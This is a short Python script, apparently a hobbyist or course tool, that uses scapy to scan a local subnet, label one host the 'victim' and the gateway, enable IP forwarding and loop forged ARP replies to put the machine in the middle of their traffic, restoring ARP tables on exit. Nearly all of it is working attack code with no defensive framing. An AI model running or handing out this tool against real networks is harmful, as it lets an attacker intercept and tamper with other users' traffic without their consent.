#!/usr/bin/env python

import scapy.all as scapy
import time,sys

def enable_ip_forward():
	# Enables IP Forward in linux
	file_path = "/proc/sys/net/ipv4/ip_forward"
	f = open(file_path,"w")
	f.write('1')
	f.close()
def scan(ip):
	arp_req = scapy.ARP(pdst = ip)
	broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
	arp_req_broadcast = broadcast/arp_req
    	ans = scapy.srp(arp_req_broadcast,timeout = 1,verbose = False)[0]
	client_list = []
	for element in ans:
		client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
		client_list.append(client_dict)
	return client_list
def spoofing(target,spoof):
	packet = scapy.ARP(op = 2,pdst = target['ip'],hwdst = target['mac'],psrc = spoof['ip'])
	#print(packet.show())
	scapy.send(packet,verbose = False)
def restore(dst,src):
	packet = scapy.ARP(op = 2,pdst = dst['ip'],hwdst = dst['mac'],psrc = src['ip'],hwsrc = src['mac'])
	scapy.send(packet,count = 4,verbose = False)
def main():
	res = scan("172.25.1.1/24")
	print("IP\t\t\tMAC Address\n-----------------------------------------")
	for client in res[1:]:
		print(client["ip"] + "\t\t" + client["mac"])
	gateway = res[0]
	victim = res[-1]
	print("\t IP\t\t\tMAC Address\n-----------------------------------------")
	print('Gateway: ' + gateway["ip"] + "\t\t" + gateway["mac"])
	print('Victim : ' + victim["ip"] + "\t\t" + victim["mac"])
	try:
		enable_ip_forward()
		print("[*] ARP spoofing...")
		while True:
			spoofing(victim,gateway) # tell victim we are router
			spoofing(gateway,victim) # tell router we are victim
			time.sleep(2)
	except KeyboardInterrupt:
		print("\n[!] ARP spoofing is terminated, restoring ARP table")
		restore(victim,gateway)
		restore(gateway,victim)
		print("[*] Sucessfully restoring ARP table")


if __name__ == '__main__':
	main()